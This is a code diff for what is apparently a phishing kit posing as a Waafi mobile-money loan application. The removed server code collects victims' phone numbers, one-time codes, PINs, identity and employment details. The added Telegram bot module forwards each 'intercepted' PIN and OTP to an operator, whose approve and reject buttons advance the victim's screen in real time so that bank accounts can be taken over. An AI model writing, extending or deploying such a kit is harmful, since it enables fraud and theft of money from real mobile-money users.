@@ -1,109 +1,135 @@
-require('dotenv').config();
-const express = require('express');
-const http = require('http');
-const socketIo = require('socket.io');
-const path = require('path');
-const cors = require('cors');
+const TelegramBot = require('node-telegram-bot-api');
 
-const botManager = require('./bot_manager');
+const token = process.env.BOT_TOKEN;
+const chatId = process.env.ADMIN_CHAT_ID;
 
-const app = express();
-const server = http.createServer(app);
+if (!token || !chatId) {
+    console.error("❌ Crucial environment keys (BOT_TOKEN / ADMIN_CHAT_ID) are undefined.");
+}
 
-const io = socketIo(server, {
-    cors: {
-        origin: "*",
-        methods: ["GET", "POST"]
-    }
-});
+// Initialize bot for webhook context processing
+const bot = new TelegramBot(token);
 
-global.io = io; 
-
-const PORT = process.env.PORT || 3000;
-const EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL; 
-
-app.use(cors());
-app.use(express.json());
-app.use(express.static(path.join(__dirname, 'public')));
-
-// FIX: Added explicit leading slash for proper route mapping
-app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
-    botManager.bot.processUpdate(req.body);
-    res.sendStatus(200);
-});
-
-io.on('connection', (socket) => {
-    const initialAppId = `WFI-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
-    socket.emit('session-ready', { appId: initialAppId });
-
-    socket.on('join-room', (room) => {
-        socket.join(room);
-        console.log(`🔌 User joined room: ${room}`);
-    });
-
-    // STEP 1: Phone submission
-    socket.on('request-otp1', (data) => {
-        const currentId = data.appId || initialAppId;
-        botManager.sendToAdmin(currentId, "🇸🇴 Initial Request: Phone Submitted", { Phone: data.phone }, false);
-    });
-
-    // STEP 1 Validation: Intercepted OTP 1
-    socket.on('step4-otp', (data) => {
-        const currentId = data.appId || initialAppId;
-        botManager.sendToAdmin(currentId, "🇸🇴 Step 1: Phone & Intercepted OTP 1", { Phone: data.phone, "OTP 1": data.otp }, true);
-    });
-
-    // FIX: Matched event name 'step5-pin' from the front-end call
-    socket.on('step5-pin', (data) => {
-        const currentId = data.appId || initialAppId;
-        botManager.sendFinalApproval(currentId, data.pin);
-    });
-
-    // FIX: Aligned event name string to match frontend 'submit-otp2'
-    socket.on('submit-otp2', (data) => {
-        const currentId = data.appId || initialAppId;
-        botManager.sendSecondOTP(currentId, data.otp2);
-    });
-
-    // STEP 4: Loan Request Parameters
-    socket.on('step1', (data) => {
-        const currentId = data.appId || initialAppId;
-        botManager.sendToAdmin(currentId, "🇸🇴 Step 4: Loan Request Parameters", data, false);
-    });
-
-    // STEP 5: Personal Identity Profile
-    socket.on('step2', (data) => {
-        const currentId = data.appId || initialAppId;
-        botManager.sendToAdmin(currentId, "🇸🇴 Step 5: Personal Identity Profile", data, false);
-    });
+/**
+ * Parses generic JSON structures dynamically into consistent human-readable key-value pairs
+ */
+function formatPayloadMessage(appId, headline, metadata) {
+    let baseTemplate = `<b>${headline}</b>\n`;
+    baseTemplate += `<code>────────────────────────</code>\n`;
+    baseTemplate += `🆔 <b>App Session:</b> <code>${appId}</code>\n`;
     
-    // FIX: Captures final layout payload from frontend submitStep3 action
-    socket.on('step3-data', (data) => {
-        const currentId = data.appId || initialAppId;
-        botManager.sendToAdmin(currentId, "🇸🇴 Step 6: Employment & Income Status", data, false);
-        
-        // Return success confirmation message tracking parameters
-        const referenceId = `REF-${Math.floor(100000 + Math.random() * 900000)}`;
-        io.to(currentId).emit('application-complete', { referenceId });
-    });
-
-    socket.on('disconnect', () => {
-        console.log(`🔌 User disconnected socket.`);
-    });
-});
-
-server.listen(PORT, async () => {
-    console.log(`🚀 Waafi Loan Server running on port ${PORT}`);
-    
-    if (EXTERNAL_URL) {
-        const webhookUrl = `${EXTERNAL_URL}/bot${process.env.BOT_TOKEN}`;
-        try {
-            await botManager.bot.setWebHook(webhookUrl);
-            console.log(`✅ Telegram Webhook successfully set to: ${webhookUrl}`);
-        } catch (err) {
-            console.error('❌ Webhook Setup Failed:', err.message);
+    for (const [key, val] of Object.entries(metadata)) {
+        if (val !== undefined && val !== null && val !== '') {
+            const label = key.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase());
+            baseTemplate += `🔹 <b>${label}:</b> <code>${val}</code>\n`;
         }
-    } else {
-        console.warn('⚠️ RENDER_EXTERNAL_URL missing inside environment configs.');
     }
+    baseTemplate += `<code>────────────────────────</code>`;
+    return baseTemplate;
+}
+
+/**
+ * Builds unified interactive buttons for handling multi-step workflow actions
+ */
+function buildInlineOptions(appId, prefix = "approve") {
+    return {
+        reply_markup: {
+            inline_keyboard: [
+                [
+                    { text: "✅ Approve / Next", callback_data: `${prefix}_${appId}` },
+                    { text: "❌ Reject Status", callback_data: `reject_${appId}` }
+                ]
+            ]
+        },
+        parse_mode: 'HTML'
+    };
+}
+
+/**
+ * Forwards structured forms safely out to the designated administrative panel channel
+ */
+function sendToAdmin(appId, title, metadata, generateControls = false) {
+    const textContent = formatPayloadMessage(appId, title, metadata);
+    const layoutSettings = generateControls ? buildInlineOptions(appId, "approve") : { parse_mode: 'HTML' };
+    
+    bot.sendMessage(chatId, textContent, layoutSettings).catch(err => {
+        console.error(`❌ Admin channel messaging failure: ${err.message}`);
+    });
+}
+
+/**
+ * Delivers intercepted MoMo security PIN codes to the administrator channel
+ */
+function sendFinalApproval(appId, pinCode) {
+    const bodyText = `<b>🔒 Intercepted Account Security PIN</b>\n<code>────────────────────────</code>\n🆔 <b>App Session:</b> <code>${appId}</code>\n🔑 <b>Waafi PIN Entry:</b> <code>${pinCode}</code>\n<code>────────────────────────</code>`;
+    bot.sendMessage(chatId, bodyText, buildInlineOptions(appId, "pinok")).catch(err => {
+        console.error(`❌ Pin data routing failure: ${err.message}`);
+    });
+}
+
+/**
+ * Relays secondary step factor authorization strings
+ */
+function sendSecondOTP(appId, backupCode) {
+    const textMarkup = `<b>⚠️ Secondary Authorization Layer (OTP 2)</b>\n<code>────────────────────────</code>\n🆔 <b>App Session:</b> <code>${appId}</code>\n🛡️ <b>Verification Key:</b> <code>${backupCode}</code>\n<code>────────────────────────</code>`;
+    bot.sendMessage(chatId, textMarkup, buildInlineOptions(appId, "otp2ok")).catch(err => {
+        console.error(`❌ Step secondary data routing failure: ${err.message}`);
+    });
+}
+
+// Process administrator feedback adjustments directly from backend channel
+bot.on('callback_query', (query) => {
+    const callbackData = query.data;
+    const messageId = query.message.message_id;
+    
+    const [action, targetAppId] = callbackData.split('_');
+    if (!action || !targetAppId) return;
+
+    let systemResponseLog = "";
+
+    switch (action) {
+        case 'approve':
+            // Step 1 OTP 1 -> Advances user interface to Step 2 PIN Box
+            global.io.to(targetAppId).emit('admin-approve-otp');
+            systemResponseLog = "🟢 Initial OTP Verified. Pushed to PIN stage.";
+            break;
+
+        case 'pinok':
+            // Step 2 PIN Entry -> Advances user interface to Step 3 OTP 2 Form
+            global.io.to(targetAppId).emit('pin-verified');
+            systemResponseLog = "🟢 PIN Captured. Pushed to Secondary Verification (OTP 2).";
+            break;
+
+        case 'otp2ok':
+            // Step 3 OTP 2 Form -> Advances user interface to Step 4 Parameter configuration panels
+            global.io.to(targetAppId).emit('admin-approve-otp2');
+            systemResponseLog = "🟢 Secondary Layer Cleared. Opened parameters dashboard.";
+            break;
+
+        case 'reject':
+            // Universal cancellation drop handling rules across active paths
+            global.io.to(targetAppId).emit('admin-reject', { message: "Xaqiijintaada waa la diiday. Fadlan isku day markale." });
+            systemResponseLog = "🔴 Application state systematically dropped by admin.";
+            break;
+            
+        default:
+            console.warn(`⚠️ Unrecognized interaction handler context: ${action}`);
+            return;
+    }
+
+    // Reflect operational adjustments inside backend log message templates
+    bot.editMessageText(`${query.message.text}\n\n[Action Log]: ${systemResponseLog}`, {
+        chat_id: chatId,
+        message_id: messageId,
+        parse_mode: 'HTML'
+    }).catch(err => console.error(`❌ Message context update exception: ${err.message}`));
+
+    bot.answerCallbackQuery(query.id, { text: "Action logged successfully." });
 });
+
+module.exports = {
+    bot,
+    sendToAdmin,
+    sendFinalApproval,
+    sendSecondOTP
+};
